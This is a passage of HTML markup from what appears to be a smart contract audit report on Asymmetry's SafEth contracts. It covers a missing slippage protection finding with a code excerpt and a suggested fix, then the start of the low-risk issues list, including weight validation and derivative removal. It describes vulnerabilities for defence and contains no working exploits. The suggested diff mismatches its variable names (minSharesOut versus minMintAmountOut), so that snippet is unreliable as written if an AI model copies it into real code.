href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed\">Asymmetry mitigated</a>:</strong></p>\n<blockquote>\n<p>Use entire balance for rebalance.<br></p>\n</blockquote>\n<p><strong>Status:</strong> Partially mitigated. Full details in reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/65\">d3e4</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/55\">adriro</a> - and also shared below in the <a href=\"#mitigation-review\">Mitigation Review</a> section.</p>\n<hr>\n<h2 id=\"m-12-no-slippage-protection-on-stake-in-safethsol\" style=\"position:relative;\"><a href=\"#m-12-no-slippage-protection-on-stake-in-safethsol\" aria-label=\"m 12 no slippage protection on stake in safethsol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/150\">[M-12] No slippage protection on <code>stake()</code> in SafEth.sol</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/150\">RaymondFam</a>, also found by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1150\">rbserver</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1041\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1018\">0xepley</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/949\">whoismatthewmc1</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/863\">Parad0x</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/849\">handsomegiraffe</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/814\">silviaxyz</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/711\">BPZ</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/699\">yac</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/549\">Franfran</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/460\">RedTiger</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/365\">ladboy233</a>, and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/232\">fyvgsk</a></em></p>\n<p><code>mintAmount</code> is determined both by <code>totalStakeValueEth</code> and <code>preDepositPrice</code>. While the former is associated with external interactions beyond users’ control, the latter should be linked to a slippage control to incentivize more staker participations.</p>\n<h3 id=\"proof-of-concept-17\" style=\"position:relative;\"><a href=\"#proof-of-concept-17\" aria-label=\"proof of concept 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>As can be seen from the code block below, <code>ethPerDerivative()</code> serves to get the price of each derivative in terms of ETH. Although it is presumed the prices entailed would be closely/stably pegged 1:1, no one could guarantee the degree of volatility just as what has recently happened to the USDC depeg.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L71-L81\">File: SafEth.sol#L71-L81</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"86\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">derivativeCount</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\"> +=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                (</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Price of safETH in regards to ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// initializes with a price of 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>When <code>underlyingValue</code> is less than <code>totalSupply</code>, <code>preDepositPrice</code> will be smaller and inversely make <code>mintAmount</code> bigger, and vice versa.</p>\n<p>Any slight change in price movement in the same direction can be consistently cumulative and reflective in stake calculations. This can make two stakers calling <code>stake()</code> with the same ETH amount minutes apart getting minted different amount of stake ERC20 tokens.</p>\n<h3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider having a user inputtable <code>minMintAmountOut</code> added in the function parameters of <code>stake()</code> and the function logic refactored as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"87\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    function stake() external payable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function stake(uint256 minMintAmountOut) external payable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [... Snipped ...]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        _mint(msg.sender, mintAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        require(shares &gt;= minSharesOut, &quot;mint amount too low&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [... Snipped ...]</span></span></span></code></pre>\n<p>Ideally, this slippage calculation should be featured in the UI, with optionally selectable stake amount impact, e.g. 0.1%.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed\">Asymmetry mitigated</a>:</strong></p>\n<blockquote>\n<p>Pass in minAmount.<br></p>\n</blockquote>\n<p><strong>Status:</strong> Incorrectly mitigated. Full details in reports from d3e4 (<a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/67\">here</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/66\">here</a>) and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/57\">adriro</a> - and also shared below in the <a href=\"#mitigation-review\">Mitigation Review</a> section.</p>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this audit, 112 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/967\">report highlighted below</a> by <strong>brgltd</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1143\">ArbitraryExecution</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1122\">alexzoid</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1118\">0xhacksmithh</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1110\">slvDev</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1109\">c3phas</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1107\">ak1</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1073\">favelanky</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1059\">m_Rassska</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1010\">Viktor_Cortess</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1008\">CodingNameKiki</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1006\">tnevler</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/993\">maxper</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/990\">KrisApostolov</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/980\">nemveer</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/977\">Udsen</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/973\">Haipls</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/971\">vagrant</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/964\">Infect3d</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/944\">Josiah</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/940\">helios</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/927\">Lavishq</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/910\">tsvetanovv</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/904\">nadin</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/903\">0xkazim</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/899\">Koko1912</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/889\">3dgeville</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/887\">Bloqarl</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/880\">siddhpurakaran</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/869\">lukris02</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/857\">pixpi</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/830\">0xWaitress</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/829\">0xffchain</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/817\">Jerry0x</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/786\">zzzitron</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/781\">carlitox477</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/778\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/771\">hl_</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/769\">Madalad</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/757\">BlueAlder</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/752\">mahdirostami</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/729\">Diana</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/707\">CodeFoxInc</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/706\">rbserver</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/704\">turvy_fuzz</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/694\">DevABDee</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/682\">0xWagmi</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/670\">yac</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/667\">Bason</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/658\">wen</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/657\">pipoca</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/655\">qpzm</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/654\">0xRajkumar</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/623\">rotcivegaf</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/611\">inmarelibero</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/596\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/563\">0xGusMcCrae</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/546\">RedTiger</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/540\">reassor</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/498\">PNS</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/496\">0xAgro</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/487\">brevis</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/483\">ayden</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/463\">peanuts</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/462\">UdarTeam</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/459\">juancito</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/435\">navinavu</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/428\">Kaysoft</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/418\">dingo2077</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/409\">0xTraub</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/407\">smaul</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/387\">Gde</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/379\">arialblack14</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/377\">catellatech</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/373\">fatherOfBlocks</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/356\">Dug</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/352\">ks__xxxxx</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/325\">Rappie</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/321\">Ignite</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/319\">DadeKuma</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/313\">ck</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/311\">lopotras</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/300\">Rickard</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/281\">codeslide</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/277\">0x3b</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/273\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/263\">Cryptor</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/244\">T1MOH</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/234\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/213\">descharre</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/208\">roelio</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/206\">0xNorman</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/190\">Brenzee</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/185\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/181\">ernestognw</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/167\">Wander</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/162\">BRONZEDISC</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/147\">btk</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/136\">0xnev</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/121\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/112\">LeoGold</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/103\">scokaf</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/99\">p_crypt0</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/88\">climber2002</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/81\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/80\">ch0bu</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/70\">chaduke</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/68\">Englave</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/53\">Sathish9098</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/50\">SunSec</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/46\">georgits</a>, and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/7\">alejandrocovrr</a>.</em></p>\n<h2 id=\"01-add-checks-for-weight-values\" style=\"position:relative;\"><a href=\"#01-add-checks-for-weight-values\" aria-label=\"01 add checks for weight values permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[01] Add checks for weight values</h2>\n<p>Currently it’s possible to set any value for the weights. Some combinations for weights could result in issues while calculating <code>ethAmount</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L169\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L169</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L187\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L187</a></p>\n<p>For example, assuming the minimum value for msg.value, three derivatives and strange values for the weights.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"88\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">msg.value = 5e17 = 0.5e18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">weight1 = 5e17   = 0.5e18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">weight2 = 19e18  =  19e18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">weight3 = 19e19  = 190e18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">ethAmount = (msg.value * weight) / totalWeight</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">5e17 * 5e17 / (5e17 + 19e18 + 19e19)</span></span></code></pre>\n<p>This would result in <code>1193317422434367.5</code> which would round down in solidity.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L88\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L88</a></p>\n<h3 id=\"recommendation-2\" style=\"position:relative;\"><a href=\"#recommendation-2\" aria-label=\"recommendation 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Add checks for min and max values for weights.</p>\n<h2 id=\"02-lack-of-method-to-remove-derivatives\" style=\"position:relative;\"><a href=\"#02-lack-of-method-to-remove-derivatives\" aria-label=\"02 lack of method to remove derivatives permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[02] Lack of method to remove derivatives</h2>\n<p>In case a derivative gets added by mistake or with incorrect parameters, currently this derivative would remain stuck in <code>SafEth.sol</code>.</p>\n<h3 id=\"recommendation-3\" style=\"position:relative;\"><a href=\"#recommendation-3\" aria-label=\"recommendation 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Consider adding a method that allows removing derivatives from <code>SafEth.sol</code>.</p>\n<h2 id=\"03-reentrancy-for-safethunstake\" style=\"position:relative;\"><a href=\"#03-reentrancy-for-safethunstake\" aria-label=\"03 reentrancy for safethunstake permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 